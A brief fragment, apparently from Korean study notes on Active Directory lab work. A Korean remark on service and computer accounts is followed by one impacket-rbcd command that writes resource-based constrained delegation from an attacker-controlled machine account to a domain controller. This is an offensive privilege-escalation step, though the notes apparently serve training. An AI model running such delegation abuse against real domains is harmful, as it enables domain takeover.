> 서비스도 하나의 계정이고, 컴퓨터도 하나의 계정인데, 각각 관리를 따로할 필요성에 의해서 만들어지게 되었다.
...
impacket-rbcd -action write -delegate-from 'attacker$' -delegate-to 'dc01$' -dc-ip 10.129.62.172 inlanefreight.local/carole.holmes
